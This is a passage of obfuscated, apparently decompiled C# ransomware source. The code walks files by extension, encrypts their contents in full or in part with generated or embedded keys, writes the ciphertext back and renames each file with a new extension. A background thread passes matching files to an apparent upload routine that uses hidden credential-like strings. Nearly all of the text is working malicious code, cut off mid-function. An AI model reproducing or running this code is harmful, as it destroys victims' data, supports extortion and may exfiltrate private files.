				OsuwEthgRZZacQeE(CS_0024_003C_003E8__locals0.sQzjrqksarliXmnhP, CS_0024_003C_003E8__locals0.kBxPEhJgsWQ, CS_0024_003C_003E8__locals0.HFAvvYnqToNmgO, CS_0024_003C_003E8__locals0.FNoMAhwXyXFqhpl, CS_0024_003C_003E8__locals0.NcdJFcIQTBnl);
			}
		});
	}

	public static void OsuwEthgRZZacQeE(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389133));
		List<string> list3 = list2;
		if (WjKjLyPEIXdw == getString_0(107397110))
		{
			list = hJGVYqVOZlMWq(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = xNoMbXrswm.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039b;
					}
				}
				if ((LNYeQleHVCaotD == getString_0(107397110) && !item.EndsWith(text)) || ngVLNnblfHHw.Contains(item))
				{
					continue;
				}
				if (hbiMFBxXkVIgur == getString_0(107396853))
				{
					try
					{
						if (bDLavqCifRg.hgwUYErfUfmB(item))
						{
							bDLavqCifRg.ZVBSVVwZBOSjy(item);
						}
					}
					catch
					{
					}
				}
				ngVLNnblfHHw.Add(item);
				if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(item)))
				{
					CyfMkozTWVl.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (DuwAfCYTUCT == getString_0(107396853) && fileStream.Length > Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024 && !list3.Contains(text))
					{
						if (SFDpinVUmMSqKHuE == getString_0(107396853))
						{
							foreach (string item2 in sAdxWTwIriShHsff)
							{
								if (item.ToLower().EndsWith(item2) && YzEXDgkVctSKX == getString_0(107396853))
								{
									if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389182), getString_0(107389177), getString_0(107389196), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && YzEXDgkVctSKX == getString_0(107397110))
								{
									try
									{
										ZAUYlWQzUcjJsT.miCKLJJWpcWV(getString_0(107389182), getString_0(107389177), getString_0(107389196), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = ZequaDafYiEEE.OYFCIPVseFW(item, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
						byte[] knotHgwphVB = ZequaDafYiEEE.HmKdoaYIxt(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						ZequaDafYiEEE.CBMnRUrBOXPu(item, knotHgwphVB);
						if (string_2 != getString_0(107386413))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386413))
					{
						pLkiXxNFkNkOqT(item, item + string_2, oybyixAEyQBUaM);
					}
					else
					{
						pLkiXxNFkNkOqT(item, item + getString_0(107386408), oybyixAEyQBUaM);
					}
				}
				catch (Exception)
				{
				}
				IL_039b:;
			}
		}
	}

	public static void okFHpRwDWrzGV(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		FxgjJBeAgKI.nENfISsEyyx CS_0024_003C_003E8__locals0 = new FxgjJBeAgKI();
		CS_0024_003C_003E8__locals0.UWBePPalaohE = list_0;
		CS_0024_003C_003E8__locals0.utySFCfMcfJj = string_1;
		CS_0024_003C_003E8__locals0.nwbGeFCbtFNo = string_2;
		CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN = string_3;
		CS_0024_003C_003E8__locals0.wyBNNoIkpYPp = new List<string> { getString_0(107389133) };
		if (LNYeQleHVCaotD == getString_0(107397110))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.UWBePPalaohE)
				{
					if (CS_0024_003C_003E8__locals0.nwbGeFCbtFNo.Length != 0)
					{
						string[] nwbGeFCbtFNo2 = CS_0024_003C_003E8__locals0.nwbGeFCbtFNo;
						int num2 = 0;
						while (num2 < nwbGeFCbtFNo2.Length)
						{
							string value2 = nwbGeFCbtFNo2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_0a4a;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.utySFCfMcfJj))
						{
							goto IL_0a4a;
						}
					}
					catch (Exception)
					{
						goto IL_0a4a;
					}
					if (item.EndsWith(string_0) && !ngVLNnblfHHw.Contains(item))
					{
						if (hbiMFBxXkVIgur == FxgjJBeAgKI.getString_0(107396872))
						{
							try
							{
								if (bDLavqCifRg.hgwUYErfUfmB(item))
								{
									bDLavqCifRg.ZVBSVVwZBOSjy(item);
								}
							}
							catch
							{
							}
						}
						ngVLNnblfHHw.Add(item);
						if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(item)))
						{
							CyfMkozTWVl.Add(Path.GetDirectoryName(item));
						}
						MpaCfTRkZWHvoHNT(item);
						try
						{
							new mbfZkiAFZEWw().cXstDkUvoPpm(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (RiGciHwEXLcD)
									{
										Console.WriteLine(FxgjJBeAgKI.getString_0(107403708) + item + FxgjJBeAgKI.getString_0(107403119) + new FileInfo(item).Length + FxgjJBeAgKI.getString_0(107403130));
										Console.WriteLine(FxgjJBeAgKI.getString_0(107403089));
									}
								}
								catch
								{
								}
								ZMMcdzUOldsoj(wcGmwtolXpKf(FxgjJBeAgKI.getString_0(107402984)), FxgjJBeAgKI.getString_0(107388135) + item + FxgjJBeAgKI.getString_0(107388135) + wcGmwtolXpKf(FxgjJBeAgKI.getString_0(107402959)) + FxgjJBeAgKI.getString_0(107388135) + Environment.UserName + FxgjJBeAgKI.getString_0(107388135) + wcGmwtolXpKf(FxgjJBeAgKI.getString_0(107402974)));
							}
						}
						catch (Exception ex18)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + item + FxgjJBeAgKI.getString_0(107402949) + ex18.Message + FxgjJBeAgKI.getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex20)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + item + FxgjJBeAgKI.getString_0(107403348) + ex20.Message + FxgjJBeAgKI.getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								goto end_IL_02cd_2;
							}
							if (!(DuwAfCYTUCT == FxgjJBeAgKI.getString_0(107396872)) || new FileInfo(item).Length <= Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024 || CS_0024_003C_003E8__locals0.wyBNNoIkpYPp.Contains(string_0))
							{
								if (vzooNONBAAoJ)
								{
									CS_0024_003C_003E8__locals0.utySFCfMcfJj = zwSwCGajjNfu + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
								}
								string text5 = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
								string text6 = FxgjJBeAgKI.getString_0(107389152);
								text6 = (AcumuDDlRST ? xgcaYSxbaKKYuMD.YKhjYVOWMHQY() : FxgjJBeAgKI.getString_0(107389152));
								string s3 = FNswwgGAUxLCaAC.ahNxsEtgrSV(text5 + text6);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != FxgjJBeAgKI.getString_0(107386432))
								{
									if (!qtSCtAyEKwnBa)
									{
										if (!AcumuDDlRST)
										{
											MDGJMFjWgcsbCsl(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, oybyixAEyQBUaM);
										}
										else
										{
											MDGJMFjWgcsbCsl(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!AcumuDDlRST)
											{
												chNSgfSgFKJs(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
											}
											else
											{
												chNSgfSgFKJs(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex22)
										{
											if (VLajbDNhoSbf)
											{
												try
												{
													File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + item + FxgjJBeAgKI.getString_0(107386386) + ex22.Message + FxgjJBeAgKI.getString_0(107396343));
												}
												catch (Exception)
												{
												}
											}
											uAQgXZmBeIANml++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!qtSCtAyEKwnBa)
								{
									if (!AcumuDDlRST)
									{
										MDGJMFjWgcsbCsl(item, item + FxgjJBeAgKI.getString_0(107386427), oybyixAEyQBUaM);
									}
									else
									{
										MDGJMFjWgcsbCsl(item, item + FxgjJBeAgKI.getString_0(107386427), Convert.FromBase64String(text5));
									}
								}
								else
								{
									try
									{
										if (!AcumuDDlRST)
										{
											chNSgfSgFKJs(item, item, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
										}
										else
										{
											chNSgfSgFKJs(item, item, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
										}
									}
									catch (Exception ex25)
									{
										if (VLajbDNhoSbf)
										{
											try
											{
												File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + item + FxgjJBeAgKI.getString_0(107386386) + ex25.Message + FxgjJBeAgKI.getString_0(107396343));
											}
											catch (Exception)
											{
											}
										}
										uAQgXZmBeIANml++;
										goto end_IL_02cd_2;
									}
								}
								if (AcumuDDlRST)
								{
									if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != FxgjJBeAgKI.getString_0(107386432))
									{
										hOfBAzalVlDAWcj(item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, bytes3);
									}
									else
									{
										hOfBAzalVlDAWcj(item, bytes3);
									}
								}
								goto IL_0a4a;
							}
							CS_0024_003C_003E8__locals0 = new FxgjJBeAgKI.RbxrafgBfeI();
							CS_0024_003C_003E8__locals0.ERbidYCXnsIaqN = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != FxgjJBeAgKI.getString_0(107386432))
								{
									if (vzooNONBAAoJ)
									{
										CS_0024_003C_003E8__locals0.utySFCfMcfJj = zwSwCGajjNfu + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.utySFCfMcfJj);
								}
							}
							catch (Exception ex27)
							{
								if (VLajbDNhoSbf)
								{
									try
									{
										File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + item + FxgjJBeAgKI.getString_0(107403319) + ex27.Message + FxgjJBeAgKI.getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								uAQgXZmBeIANml++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = FxgjJBeAgKI.getString_0(107389152);
							if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != FxgjJBeAgKI.getString_0(107386432))
							{
								CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = item + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
							}
							else
							{
								CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm = item;
							}
							if (SFDpinVUmMSqKHuE == FxgjJBeAgKI.getString_0(107396872))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in sAdxWTwIriShHsff)
									{
										if (CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.ERbidYCXnsIaqN.utySFCfMcfJj) && YzEXDgkVctSKX == FxgjJBeAgKI.RbxrafgBfeI.getString_0(107396875))
										{
											if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm).Length)
											{
												try
												{
													ZAUYlWQzUcjJsT.miCKLJJWpcWV(FxgjJBeAgKI.RbxrafgBfeI.getString_0(107389204), FxgjJBeAgKI.RbxrafgBfeI.getString_0(107389199), FxgjJBeAgKI.RbxrafgBfeI.getString_0(107389218), CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm.ToLower().EndsWith(item2) && YzEXDgkVctSKX == FxgjJBeAgKI.RbxrafgBfeI.getString_0(107397132))
										{
											try
											{
												ZAUYlWQzUcjJsT.miCKLJJWpcWV(FxgjJBeAgKI.RbxrafgBfeI.getString_0(107389204), FxgjJBeAgKI.RbxrafgBfeI.getString_0(107389199), FxgjJBeAgKI.RbxrafgBfeI.getString_0(107389218), CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text7 = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
							string text8 = FxgjJBeAgKI.getString_0(107389152);
							text8 = (AcumuDDlRST ? xgcaYSxbaKKYuMD.YKhjYVOWMHQY() : FxgjJBeAgKI.getString_0(107389152));
							string s4 = FNswwgGAUxLCaAC.ahNxsEtgrSV(text7 + text8);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (QYWNitRbofuBkTAcs == FxgjJBeAgKI.getString_0(107397129))
							{
								byte[] array2 = null;
								byte[] byte_2 = ZequaDafYiEEE.OYFCIPVseFW(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
								if (ZequaDafYiEEE.CBMnRUrBOXPu(KnotHgwphVB: (!rqILzTAnaGs) ? (AcumuDDlRST ? ZequaDafYiEEE.HmKdoaYIxt(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ZequaDafYiEEE.HmKdoaYIxt(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (AcumuDDlRST ? GYrgigmSJl.YnZehuQLJizp(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : GYrgigmSJl.YnZehuQLJizp(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN), Convert.FromBase64String(MLaZeafODt))), rLBaDxrvUPxawf: CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, bZjXaGuPypAlc: bytes4))
								{
									goto IL_0a4a;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!AcumuDDlRST)
							{
								if (HZTGcNttCaj.lqncezAjKg(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, SHZkgBAmdkcxAL, CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN, null, Convert.FromBase64String(MLaZeafODt)))
								{
									goto IL_0a4a;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (HZTGcNttCaj.lqncezAjKg(CS_0024_003C_003E8__locals0.BDZCAuBdihSBznm, SHZkgBAmdkcxAL, text7, bytes4, Convert.FromBase64String(text8)))
								{
									goto IL_0a4a;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.utySFCfMcfJj, item);
								}
								catch (Exception)
								{
								}
							}
							end_IL_02cd_2:;
						}
						catch (Exception)
						{
							goto IL_0a4a;
						}
					}
					continue;
					IL_0a4a:
					CS_0024_003C_003E8__locals0.UWBePPalaohE.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.UWBePPalaohE, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new FxgjJBeAgKI.nENfISsEyyx();
			CS_0024_003C_003E8__locals0.ERbidYCXnsIaqN = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg = string_0;
			if (CS_0024_003C_003E8__locals0.nwbGeFCbtFNo.Length != 0)
			{
				string[] nwbGeFCbtFNo = CS_0024_003C_003E8__locals0.nwbGeFCbtFNo;
				int num = 0;
				while (num < nwbGeFCbtFNo.Length)
				{
					string value = nwbGeFCbtFNo[num];
					if (!CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0b2a;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.EndsWith(CS_0024_003C_003E8__locals0.utySFCfMcfJj))
				{
					goto IL_0b2a;
				}
			}
			catch (Exception)
			{
				goto IL_0b2a;
			}
			if (!ngVLNnblfHHw.Contains(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg))
			{
				if (hbiMFBxXkVIgur == FxgjJBeAgKI.getString_0(107396872))
				{
					try
					{
						if (bDLavqCifRg.hgwUYErfUfmB(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg))
						{
							bDLavqCifRg.ZVBSVVwZBOSjy(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
						}
					}
					catch
					{
					}
				}
				ngVLNnblfHHw.Add(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				if (!CyfMkozTWVl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg)))
				{
					CyfMkozTWVl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg));
				}
				MpaCfTRkZWHvoHNT(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				try
				{
					new mbfZkiAFZEWw().cXstDkUvoPpm(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (RiGciHwEXLcD)
							{
								Console.WriteLine(FxgjJBeAgKI.getString_0(107403708) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107403119) + new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length + FxgjJBeAgKI.getString_0(107403130));
								Console.WriteLine(FxgjJBeAgKI.getString_0(107403089));
							}
						}
						catch
						{
						}
						ZMMcdzUOldsoj(wcGmwtolXpKf(FxgjJBeAgKI.getString_0(107402984)), FxgjJBeAgKI.getString_0(107388135) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107388135) + wcGmwtolXpKf(FxgjJBeAgKI.getString_0(107402959)) + FxgjJBeAgKI.getString_0(107388135) + Environment.UserName + FxgjJBeAgKI.getString_0(107388135) + wcGmwtolXpKf(FxgjJBeAgKI.getString_0(107402974)));
					}
				}
				catch (Exception ex2)
				{
					if (VLajbDNhoSbf)
					{
						try
						{
							File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107402949) + ex2.Message + FxgjJBeAgKI.getString_0(107396343));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (VLajbDNhoSbf)
						{
							try
							{
								File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107403348) + ex4.Message + FxgjJBeAgKI.getString_0(107396343));
							}
							catch (Exception)
							{
							}
						}
						uAQgXZmBeIANml++;
						goto end_IL_031d_2;
					}
					if (DuwAfCYTUCT == FxgjJBeAgKI.getString_0(107396872) && new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length > Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != FxgjJBeAgKI.getString_0(107386432))
							{
								if (vzooNONBAAoJ)
								{
									CS_0024_003C_003E8__locals0.utySFCfMcfJj = zwSwCGajjNfu + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
								}
								File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj);
							}
						}
						catch (Exception ex6)
						{
							if (VLajbDNhoSbf)
							{
								try
								{
									File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107403319) + ex6.Message + FxgjJBeAgKI.getString_0(107396343));
								}
								catch (Exception)
								{
								}
							}
							uAQgXZmBeIANml++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != FxgjJBeAgKI.getString_0(107386432))
						{
							CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg += CS_0024_003C_003E8__locals0.utySFCfMcfJj;
						}
						if (SFDpinVUmMSqKHuE == FxgjJBeAgKI.getString_0(107396872))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in sAdxWTwIriShHsff)
								{
									if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.ERbidYCXnsIaqN.utySFCfMcfJj) && YzEXDgkVctSKX == FxgjJBeAgKI.nENfISsEyyx.getString_0(107396878))
									{
										if (Convert.ToInt32(ljXGZTEjpxSlR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg).Length)
										{
											try
											{
												ZAUYlWQzUcjJsT.miCKLJJWpcWV(FxgjJBeAgKI.nENfISsEyyx.getString_0(107389207), FxgjJBeAgKI.nENfISsEyyx.getString_0(107389202), FxgjJBeAgKI.nENfISsEyyx.getString_0(107389221), CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg.ToLower().EndsWith(item3) && YzEXDgkVctSKX == FxgjJBeAgKI.nENfISsEyyx.getString_0(107397135))
									{
										try
										{
											ZAUYlWQzUcjJsT.miCKLJJWpcWV(FxgjJBeAgKI.nENfISsEyyx.getString_0(107389207), FxgjJBeAgKI.nENfISsEyyx.getString_0(107389202), FxgjJBeAgKI.nENfISsEyyx.getString_0(107389221), CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
						string text2 = FxgjJBeAgKI.getString_0(107389152);
						text2 = (AcumuDDlRST ? xgcaYSxbaKKYuMD.YKhjYVOWMHQY() : FxgjJBeAgKI.getString_0(107389152));
						string s = FNswwgGAUxLCaAC.ahNxsEtgrSV(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (QYWNitRbofuBkTAcs == FxgjJBeAgKI.getString_0(107397129))
						{
							byte[] array = null;
							byte[] byte_ = ZequaDafYiEEE.OYFCIPVseFW(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, Convert.ToInt32(SHZkgBAmdkcxAL) * 1024 * 1024);
							if (!ZequaDafYiEEE.CBMnRUrBOXPu(KnotHgwphVB: (!rqILzTAnaGs) ? (AcumuDDlRST ? ZequaDafYiEEE.HmKdoaYIxt(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ZequaDafYiEEE.HmKdoaYIxt(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (AcumuDDlRST ? GYrgigmSJl.YnZehuQLJizp(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : GYrgigmSJl.YnZehuQLJizp(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN), Convert.FromBase64String(MLaZeafODt))), rLBaDxrvUPxawf: CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, bZjXaGuPypAlc: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!AcumuDDlRST)
						{
							if (!HZTGcNttCaj.lqncezAjKg(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, SHZkgBAmdkcxAL, CS_0024_003C_003E8__locals0.pPYjMJSGlCKrKN, null, Convert.FromBase64String(MLaZeafODt)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!HZTGcNttCaj.lqncezAjKg(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, SHZkgBAmdkcxAL, text, bytes, Convert.FromBase64String(text2)))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (vzooNONBAAoJ)
						{
							CS_0024_003C_003E8__locals0.utySFCfMcfJj = zwSwCGajjNfu + CS_0024_003C_003E8__locals0.utySFCfMcfJj;
						}
						string text3 = xgcaYSxbaKKYuMD.WocDKMFkPpSXo(32);
						string text4 = FxgjJBeAgKI.getString_0(107389152);
						text4 = (AcumuDDlRST ? xgcaYSxbaKKYuMD.YKhjYVOWMHQY() : FxgjJBeAgKI.getString_0(107389152));
						string s2 = FNswwgGAUxLCaAC.ahNxsEtgrSV(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.utySFCfMcfJj != FxgjJBeAgKI.getString_0(107386432))
						{
							if (!qtSCtAyEKwnBa)
							{
								if (!AcumuDDlRST)
								{
									MDGJMFjWgcsbCsl(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, oybyixAEyQBUaM);
								}
								else
								{
									MDGJMFjWgcsbCsl(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!AcumuDDlRST)
									{
										chNSgfSgFKJs(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, oybyixAEyQBUaM, Convert.FromBase64String(MLaZeafODt));
									}
									else
									{
										chNSgfSgFKJs(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex11)
								{
									if (VLajbDNhoSbf)
									{
										try
										{
											File.AppendAllText(MGkBzYPheHDPb, FxgjJBeAgKI.getString_0(107386181) + CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + FxgjJBeAgKI.getString_0(107386386) + ex11.Message + FxgjJBeAgKI.getString_0(107396343));
										}
										catch (Exception)
										{
										}
									}
									uAQgXZmBeIANml++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg + CS_0024_003C_003E8__locals0.utySFCfMcfJj, CS_0024_003C_003E8__locals0.qyZDUzTWNklpNg);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!qtSCtAyEKwnBa)
						{
							if (!AcumuDDlRST)
							{
